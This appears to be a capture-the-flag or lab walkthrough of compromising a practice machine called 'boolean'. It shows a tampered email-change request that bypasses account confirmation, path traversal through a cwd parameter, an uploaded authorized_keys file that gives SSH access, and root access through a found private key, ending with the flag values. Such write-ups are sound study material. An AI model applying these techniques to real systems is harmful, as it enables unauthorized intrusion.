`---------------------Starting Full Scan------------------------`

`PORT      STATE SERVICE`
`22/tcp    open  ssh`
`80/tcp    open  http`
`33017/tcp open  unknown`

Check out port 80

![[Pasted image 20240208155728.png]]

No weak passwords on this one and no quick exploits on Google
Create an account

![[Pasted image 20240208155924.png]]

What happens if we try to login anyway
![[Pasted image 20240208160010.png]]

What if we try to change the email address 

![[Pasted image 20240208160042.png]]

If we check these requests out in Burp, one is slightly different

![[Pasted image 20240208160142.png]]

If we URL decode the method parameter from it

![[Pasted image 20240208160314.png]]
`_method=patch&authenticity_token=Zp9LBogX6hrLmSdn9W4SiZqF6uVZMVVhJMF1RjoJFPo1FTauKWME8uI13tkyHj2beomu6qIoeglbvxP_kxymqw&user[email]=testing123@testing.com&commit=Change email`

If we send this request, in the response we see a confirmation parameter.

![[Pasted image 20240208160429.png]]

I wonder if we can manipulate this. Right click the request and copy it as a curl command.
Paste it into terminal and add this (like the user[email] parameter)

![[Pasted image 20240208160628.png]]

Send it - response looks good

`HTTP/1.1 200 OK`
`X-Frame-Options: SAMEORIGIN`
`X-XSS-Protection: 1; mode=block`
`X-Content-Type-Options: nosniff`
`X-Download-Options: noopen`
`X-Permitted-Cross-Domain-Policies: none`
`Referrer-Policy: strict-origin-when-cross-origin`
`Content-Type: application/json; charset=utf-8`
`Vary: Accept`
`ETag: W/"ba3d1526cd3a164e9967c8487f86c92c"`
`Cache-Control: max-age=0, private, must-revalidate`
`Set-Cookie: _boolean_session=Z3HVENjbWmUT0B9mJ6GaHGJF3JzzlyLGGu8qA8%2Fb8yiurg%2F4mdk0gz4m%2BIDjdKpnAcPeSItl0nI2evcMbrMZp6yp9apjygEvTntHJM69H1MiTaGBGxP%2F63hBuLUhnjzi8RAqEsjgjKu1EJHxYSzw8xNTG9ol%2BSgFhQMKAxfygYV25tH58YMgrt7ZRxpqu5AV%2BEEz07pWl9KEnjS7PeNvY4fivS8Jj1uMiYTCXTuTliL92oxEig3chUq2Nu%2BCQKm4h6NSccsBt4Pv8Q9GJaTvkpaKwILnL%2BkPJnRyw2Y9Mv8Do1hjInCYtg%3D%3D--ug2FlXnJAY%2BO%2B2VG--cRdor8E61B6VWU4lcBomhQ%3D%3D; path=/; HttpOnly; SameSite=Lax`
`X-Request-Id: fb6d70ba-e641-4556-8cfc-c78276d3e0c2`
`X-Runtime: 0.028029`
`Connection: close`
`Transfer-Encoding: chunked`

`{"email":"testing123@testing.com","confirmed":true,"id":2,"username":"testing","created_at":"2024-02-08T20:58:54.361Z","updated_at":"2024-02-08T21:08:12.085Z"}` 

Now it lets us login and get to the filemanager

If we upload a file, we can't get it to execute but we can see in the URL it has cwd for current directory. Let's try to move directories.

![[Pasted image 20240208161253.png]]

Looks like this is working. Go to the home directory and find our user.

http://192.168.190.231/?cwd=../../../../../../../../../../home

![[Pasted image 20240208161358.png]]

It lets us into this folder so the webserver is running as root or this user.
![[Pasted image 20240208161440.png]]

In the .ssh folder there is a keys folder with some SSH keys. None of them seem to work though.

Let's generate our own authorized_keys file and see if we can upload that in .ssh

![[Pasted image 20240208161545.png]]

This works and we can now ssh in as remi

![[Pasted image 20240208161706.png]]

Let's check that root private key and see if it works with the loopback address

`remi@boolean:~/.ssh/keys$ ssh -i root root@127.0.0.1`
`Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures`
`Disconnected from 127.0.0.1 port 22`
`remi@boolean:~/.ssh/keys$` 

So the key might still be good but we're getting Too many authentication failures. There must be a way to fix this.

Try the IdentitiesOnly option 
`ssh -i root -o IdentitiesOnly=yes root@127.0.0.1`

This works and we get root

`remi@boolean:~/.ssh/keys$ ssh -i root -o IdentitiesOnly=yes root@127.0.0.1`
`Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64`

`The programs included with the Debian GNU/Linux system are free software;`
`the exact distribution terms for each program are described in the`
`individual files in /usr/share/doc/*/copyright.`

`Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent`
`permitted by applicable law.`
`root@boolean:~# cat /root/proof.txt`
`16c42fd4894d61767502b85a2be756b5`
`root@boolean:~# cd /home/`
`root@boolean:/home# ls`
`remi`
`root@boolean:/home# cd remi`
`root@boolean:/home/remi# ls`
`boolean  local.txt`
`root@boolean:/home/remi# cat local.txt`
`e07f7a23ff8007bbe95ca96969c84358`
`root@boolean:/home/remi#` 

